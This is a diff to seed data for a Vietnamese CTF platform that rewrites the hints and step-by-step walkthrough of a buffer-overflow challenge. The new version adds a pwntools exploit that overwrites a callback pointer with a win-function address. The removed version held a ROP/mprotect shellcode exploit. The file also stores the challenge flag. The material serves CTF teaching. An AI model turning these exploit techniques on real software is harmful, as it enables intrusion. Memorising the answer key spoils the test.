@@ -62,7 +62,7 @@ Bạn cần khai thác lỗ hổng này để lấy flag. Challenge này yêu c�
       difficulty: "master hacker",
       points: 500,
       flag: "VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}",
-      author: "CTF Team",
+      author: "F12FLASH",
       solves: 0,
     };
     
@@ -72,19 +72,19 @@ Bạn cần khai thác lỗ hổng này để lấy flag. Challenge này yêu c�
       {
         challengeId: stacklessStackId,
         order: 1,
-        content: "Bắt đầu bằng việc phân tích binary với các công cụ như radare2, ghidra hoặc IDA. Tìm kiếm các hàm quan trọng và xác định vị trí buffer overflow.",
+        content: "Phân tích binary với 'nm' hoặc 'objdump' để tìm địa chỉ các hàm quan trọng. Đặc biệt chú ý đến hàm win_function tại 0x401390 và cấu trúc memory_region_t.",
         pointsCost: 50,
       },
       {
         challengeId: stacklessStackId,
         order: 2,
-        content: "Binary không có stack truyền thống, nhưng vẫn có buffer overflow. Hãy tìm các syscall gadget có thể sử dụng để xây dựng ROP chain.",
+        content: "Cấu trúc memory_region_t có: data[256 bytes] + callback pointer[8 bytes] + magic[8 bytes]. Overflow buffer để ghi đè callback pointer tại offset 256.",
         pointsCost: 100,
       },
       {
         challengeId: stacklessStackId,
         order: 3,
-        content: "Sử dụng mprotect syscall để thay đổi quyền của vùng nhớ thành executable. Đây là chìa khóa để thực thi shellcode trong môi trường stackless.",
+        content: "Ghi đè callback pointer với địa chỉ win_function (0x401390) và giữ magic value = 0xdeadbeef. Binary sẽ tự động gọi win_function khi kiểm tra magic value.",
         pointsCost: 150,
       },
     ];
@@ -99,150 +99,199 @@ Bạn cần khai thác lỗ hổng này để lấy flag. Challenge này yêu c�
         challengeId: stacklessStackId,
         order: 1,
         title: "Reconnaissance - Phân tích Binary",
-        content: `Bước đầu tiên trong việc khai thác bất kỳ binary nào là hiểu rõ về cấu trúc và hành vi của nó.
+        content: `Bước đầu tiên là phân tích binary để hiểu rõ về cấu trúc, bảo vệ và các hàm quan trọng.
 
-Sử dụng các công cụ sau để phân tích:
+Công cụ phân tích:
 - file: Xác định loại file và kiến trúc
-- checksec: Kiểm tra các cơ chế bảo vệ (NX, PIE, ASLR, etc.)
-- radare2/ghidra/IDA: Disassemble và phân tích code
+- nm/objdump: Tìm địa chỉ các hàm
+- readelf: Xem thông tin ELF header
+- strings: Tìm chuỗi ký tự trong binary
 
 Kết quả quan trọng:
-- Binary là x86-64 ELF
-- Không có stack canary
-- NX enabled (vùng stack không thực thi được)
-- ASLR enabled
-- Binary sử dụng mmap thay vì stack truyền thống`,
+- Binary: ELF 64-bit x86-64, dynamically linked, not stripped
+- Bảo vệ: NX enabled, No PIE, No stack canary
+- Các hàm quan trọng:
+  • win_function: 0x401390 (hàm đọc flag)
+  • process_data: 0x401320 (callback mặc định)
+  • vulnerable_function: 0x4015d0 (hàm có lỗ hổng)`,
         codeBlock: `$ file stackless_stack
-stackless_stack: ELF 64-bit LSB executable, x86-64
+stackless_stack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
+dynamically linked, not stripped
 
-$ checksec stackless_stack
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)`,
+$ nm stackless_stack | grep -E "(win|process|vulnerable)"
+0000000000401320 T process_data
+00000000004015d0 T vulnerable_function
+0000000000401390 T win_function
+
+$ readelf -h stackless_stack | grep "Entry point"
+  Entry point address:               0x401220`,
         language: "bash",
       },
       {
         challengeId: stacklessStackId,
         order: 2,
-        title: "Vulnerability Analysis - Tìm lỗ hổng",
-        content: `Sau khi disassemble, chúng ta phát hiện ra một hàm vulnerable đọc input vào buffer được cấp phát bởi mmap.
+        title: "Vulnerability Analysis - Phân tích cấu trúc dữ liệu",
+        content: `Phân tích source code (stackless_stack.c) để hiểu cấu trúc memory_region_t:
 
-Đặc điểm của lỗ hổng:
-- Buffer overflow trong vùng nhớ mmap
-- Không có return address trên stack truyền thống
-- Có thể ghi đè lên các con trỏ và data structures quan trọng
+typedef struct {
+    char data[BUFFER_SIZE];      // 0x100 bytes (256 bytes)
+    void (*callback)(char*);     // 8 bytes (function pointer)
+    unsigned long magic;         // 8 bytes (0xdeadbeef)
+} memory_region_t;
 
-Vùng nhớ mmap có quyền RW (read-write) nhưng không executable. Chúng ta cần bypass NX protection.`,
-        codeBlock: `void vulnerable_function() {
-    char *buffer = mmap(NULL, 0x1000, 
-                       PROT_READ | PROT_WRITE,
-                       MAP_PRIVATE | MAP_ANONYMOUS, 
-                       -1, 0);
-    
-    // Vulnerable read - no bounds checking!
-    read(0, buffer, 0x2000);  // Can overflow!
-    
-    // Some processing...
-}`,
+LỖ HỔNG: vulnerable_function() đọc MAX_INPUT (0x600 = 1536 bytes) vào buffer chỉ có 256 bytes!
+- Offset 0-255: data buffer
+- Offset 256-263: callback pointer (có thể ghi đè!)
+- Offset 264-271: magic value (phải = 0xdeadbeef)
+
+Điều kiện trigger:
+- Line 174-176 trong source: Nếu magic == 0xdeadbeef và callback != NULL, 
+  binary sẽ gọi callback(region->data)
+
+CHIẾN LƯỢC: Overflow buffer → ghi đè callback → trỏ đến win_function!`,
+        codeBlock: `// Từ stackless_stack.c - vulnerable_function()
+#define BUFFER_SIZE 0x100    // 256 bytes
+#define MAX_INPUT   0x600    // 1536 bytes - OVERFLOW!
+
+ssize_t bytes_read = read(STDIN_FILENO, region->data, MAX_INPUT);
+// Đọc 1536 bytes vào buffer 256 bytes → Buffer Overflow!
+
+// Điều kiện trigger callback (line 174-176)
+if (region->magic == MAGIC_VALUE && region->callback != NULL) {
+    region->callback(region->data);  // Gọi callback!
+}
+
+// Memory Layout
+// +0x000: data[256]
+// +0x100: callback pointer (8 bytes) ← GHI ĐÈ ĐÂY!
+// +0x108: magic (8 bytes) = 0xdeadbeef`,
         language: "c",
       },
       {
         challengeId: stacklessStackId,
         order: 3,
-        title: "ROP Chain Construction",
-        content: `Vì không có stack return address, chúng ta cần tìm cách khác để kiểm soát execution flow.
+        title: "Xây dựng Payload - Tính toán Offset",
+        content: `Bây giờ chúng ta biết:
+1. win_function tại địa chỉ: 0x401390
+2. Callback pointer tại offset: 256 (0x100)
+3. Magic value tại offset: 264 (0x108)
 
-Chiến lược:
-1. Tìm các syscall gadgets trong binary
-2. Xây dựng ROP chain để gọi mprotect syscall
-3. Sử dụng mprotect để thay đổi quyền vùng nhớ thành RWX
-4. Nhảy vào shellcode đã được inject
+Payload structure:
+- Bytes 0-255: Padding (256 bytes bất kỳ)
+- Bytes 256-263: Địa chỉ win_function (0x0000000000401390 - little endian)
+- Bytes 264-271: Magic value (0x00000000deadbeef - little endian)
 
-Các gadgets cần thiết:
-- pop rdi; ret (argument 1)
-- pop rsi; ret (argument 2)
-- pop rdx; ret (argument 3)
-- pop rax; ret (syscall number)
-- syscall; ret`,
-        codeBlock: `# ROPgadget --binary stackless_stack
-0x00401234 : pop rdi ; ret
-0x00401236 : pop rsi ; ret
-0x00401238 : pop rdx ; ret
-0x0040123a : pop rax ; ret
-0x0040123c : syscall ; ret
+LƯU Ý: x86-64 sử dụng little endian, địa chỉ phải được đảo ngược byte order.
+Little endian của 0x401390 = \\x90\\x13\\x40\\x00\\x00\\x00\\x00\\x00`,
+        codeBlock: `# Tìm gadgets có sẵn trong binary
+$ ROPgadget --binary stackless_stack --only "pop|ret"
+0x0000000000401205 : pop r12 ; ret
+0x00000000004012ed : pop rbp ; ret
+0x0000000000401203 : pop rbx ; pop rbp ; pop r12 ; ret
+0x0000000000401520 : pop rbx ; ret
+0x000000000040101a : ret
 
-# mprotect syscall number: 10
-# mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)`,
-        language: "python",
+# QUAN TRỌNG: Binary này KHÔNG CẦN ROP chain phức tạp!
+# Chỉ cần ghi đè callback pointer là đủ.
+
+# Cấu trúc memory
+Offset 0x000: [256 bytes data buffer]
+Offset 0x100: [callback pointer] ← Ghi đè = 0x401390
+Offset 0x108: [magic value]     ← Giữ nguyên = 0xdeadbeef`,
+        language: "bash",
       },
       {
         challengeId: stacklessStackId,
         order: 4,
-        title: "Exploit Implementation",
-        content: `Kết hợp tất cả lại với nhau để tạo exploit hoàn chỉnh.
+        title: "Exploit Implementation - Python Script",
+        content: `Viết exploit script hoàn chỉnh sử dụng pwntools.
 
-Các bước thực hiện:
-1. Tính toán offset để overflow
-2. Inject shellcode vào vùng nhớ mmap
-3. Xây dựng ROP chain để gọi mprotect
-4. Thay đổi quyền vùng nhớ thành executable
-5. Redirect execution đến shellcode
+Chiến lược đơn giản:
+1. Tạo 256 bytes padding
+2. Ghi đè callback pointer = 0x401390 (win_function)
+3. Ghi đè magic value = 0xdeadbeef
+4. Gửi payload và nhận flag!
 
-Shellcode có thể là:
-- execve("/bin/sh") để có shell
-- open/read/write để đọc flag file
-- Hoặc bất kỳ payload nào bạn muốn`,
-        codeBlock: `from pwn import *
+KHÔNG CẦN ROP CHAIN phức tạp vì:
+- Binary tự động gọi callback khi magic value match
+- win_function đã có sẵn để đọc flag
+- Chỉ cần redirect callback pointer là đủ`,
+        codeBlock: `#!/usr/bin/env python3
+from pwn import *
 
-# Connect to challenge
-p = remote('ctf.example.com', 1337)
+# Configuration
+binary = './stackless_stack'
+win_addr = 0x401390      # Địa chỉ win_function
+magic_value = 0xdeadbeef # Magic value cần giữ nguyên
 
-# Build ROP chain for mprotect
-rop = ROP('./stackless_stack')
-rop.raw(rop.find_gadget(['pop rdi', 'ret']))
-rop.raw(0x600000)  # mmap address
-rop.raw(rop.find_gadget(['pop rsi', 'ret']))
-rop.raw(0x1000)    # size
-rop.raw(rop.find_gadget(['pop rdx', 'ret']))
-rop.raw(7)         # PROT_READ|WRITE|EXEC
-rop.raw(rop.find_gadget(['pop rax', 'ret']))
-rop.raw(10)        # mprotect syscall
-rop.raw(rop.find_gadget(['syscall', 'ret']))
+# Create payload
+payload = b'A' * 256                    # Padding 256 bytes
+payload += p64(win_addr)                # Ghi đè callback → win_function
+payload += p64(magic_value)             # Giữ magic = 0xdeadbeef
 
-# Shellcode
-shellcode = asm(shellcraft.sh())
-
-# Build payload
-payload = shellcode
-payload += b'A' * (offset - len(shellcode))
-payload += rop.chain()
-
-p.send(payload)
-p.interactive()`,
+# Local exploit
+if __name__ == '__main__':
+    # Uncomment để test local
+    # p = process(binary)
+    
+    # Uncomment để attack remote
+    # p = remote('host', port)
+    
+    # Hoặc test bằng cách ghi vào file
+    with open('payload.bin', 'wb') as f:
+        f.write(payload)
+    
+    print(f"[+] Payload size: {len(payload)} bytes")
+    print(f"[+] Win function: {hex(win_addr)}")
+    print(f"[+] Payload saved to payload.bin")
+    print(f"[+] Test: ./stackless_stack < payload.bin")
+    
+    # p.sendline(payload)
+    # p.interactive()`,
         language: "python",
       },
       {
         challengeId: stacklessStackId,
         order: 5,
-        title: "Getting the Flag",
-        content: `Sau khi exploit thành công, bạn sẽ có quyền thực thi code trong context của binary.
+        title: "Testing và Getting the Flag",
+        content: `Sau khi tạo payload, test exploit để lấy flag!
 
-Có nhiều cách để lấy flag:
-- Nếu shellcode của bạn spawn shell, chỉ cần cat flag.txt
-- Nếu sử dụng open/read/write syscalls, đọc trực tiếp flag file
-- Flag có thể nằm trong memory, trong file, hoặc được in ra sau khi exploit thành công
+CÁCH 1: Test với file payload
+Tạo payload binary file và pipe vào binary:
+python3 exploit.py → Tạo payload.bin
+./stackless_stack < payload.bin → Chạy với payload
 
-Flag format: VNFLAG{...}
+CÁCH 2: Test với pwntools
+Uncomment dòng p = process(binary) trong script
+Chạy python3 exploit.py
 
-Congratulations nếu bạn đã đến được đây! Đây là một challenge khó đòi hỏi hiểu biết sâu về binary exploitation, ROP, và syscalls.`,
-        codeBlock: `$ python exploit.py
-[+] Opening connection to ctf.example.com on port 1337
-[*] Switching to interactive mode
-$ cat flag.txt
-VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}
-$ exit
-[*] Closed connection`,
+CÁCH 3: Manual payload với Python
+Tạo payload trực tiếp bằng Python one-liner
+
+Kết quả mong đợi:
+- Binary sẽ in ra: "[🎯] FLAG CAPTURED: VNFLAG{...}"
+- win_function sẽ đọc flag từ /tmp/flag.txt
+- Nếu không có flag file, sẽ in demo flag
+
+Congratulations! Bạn đã hoàn thành challenge bằng cách khai thác buffer overflow và hijack function pointer - một kỹ thuật cơ bản nhưng quan trọng trong binary exploitation!`,
+        codeBlock: `# Method 1: Sử dụng script Python
+$ python3 exploit.py
+[+] Payload size: 272 bytes
+[+] Win function: 0x401390
+[+] Payload saved to payload.bin
+[+] Test: ./stackless_stack < payload.bin
+
+$ ./stackless_stack < payload.bin
+[🎯] FLAG CAPTURED: VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}
+
+# Method 2: Manual Python one-liner
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*256 + b'\\x90\\x13\\x40\\x00\\x00\\x00\\x00\\x00' + b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00')" | ./stackless_stack
+
+# Verify exploit worked
+$ echo $?
+0
+
+# Flag format: VNFLAG{...}`,
         language: "bash",
       },
     ];
